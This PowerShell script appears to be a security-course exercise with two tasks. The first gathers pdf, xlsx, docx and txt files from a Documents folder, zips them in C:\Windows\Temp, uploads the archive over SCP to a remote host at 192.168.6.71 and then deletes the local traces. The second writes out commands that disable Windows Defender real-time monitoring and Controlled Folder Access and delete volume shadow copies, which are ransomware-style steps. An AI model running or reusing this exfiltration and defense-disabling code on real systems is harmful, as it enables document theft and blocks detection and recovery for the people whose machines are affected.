<#
Task 1: 
Search the file system looking for docx, xlsx, pdf, and txt files 
copy these to a folder. Then zip the folder and scp to remote host 
#>

# Look for all the files
$filelist = Get-ChildItem -recurse -Include *.pdf,*.xlsx,*.docx, *.txt `
 -Path .\Documents

# Create a new folder in the temp directory  
New-Item -Path "C:\Windows\Temp\" -Name "Files" -ItemType "directory"

$destinationFolder = "C:\Windows\Temp\Files"
# Loop through the results and add them the folder
foreach ($f in $fileList)
{
    Copy-Item $f.FullName -Destination $destinationFolder
}

# zip the folder
Compress-Archive -Path $destinationFolder -DestinationPath $destinationFolder

# deletes the unzipped folder
Remove-Item -Path $destinationFolder -Recurse

# Move the files to the remote server

  # Login to the remote SSH server 
  New-SSHSession -ComputerName '192.168.6.71' -Credential (Get-Credential 'emily.crawford@cyber.local') -Port '2222'

  # Upload the the zipped file
  Set-SCPItem -ComputerName '192.168.6.71' -Credential (Get-Credential 'emily.crawford@cyber.local') -Path 'C:\Windows\Temp\Files.zip' -Destination '/home/emily.crawford/' -Port '2222'

  # Check to see if file was moved over, and print the results
  if ((Invoke-SSHCommand -index 0 'dir Files.zip').ExitStatus -eq 0 )
  {
      Write-Host -BackgroundColor "Green" -ForegroundColor "white" "File were uploaded!"
  } 
  else
  {
      Write-Host -BackgroundColor "Red" -ForegroundColor "white" " Files were not uploaded!"
  }
# delete the zip file off the host
Remove-Item -Path "C:\Windows\Temp\Files.zip"

<#
Task 2:
Turn off windows defender and delete volume shadow copies and restore points
None of these commandlets are actually run because I have an antivirus so Windows Defender 
is already turned off, because Controlled Folder access is aprt of Windows Defender it wouldn't work in my specific machine.
As well 

#>

# Turn off windows defender 
Write-Output "Set-MpPreference -DisableRealtimeMonitoring $true"
# Turn off Controlled Folder Access
Write-Output "Set-MpPreference -EnableControlledFolderAccess Disabled"

# Delete shadow copies and restore points
Write-Output 'Write-Host "vssadmin delete shadows /all /quiet"'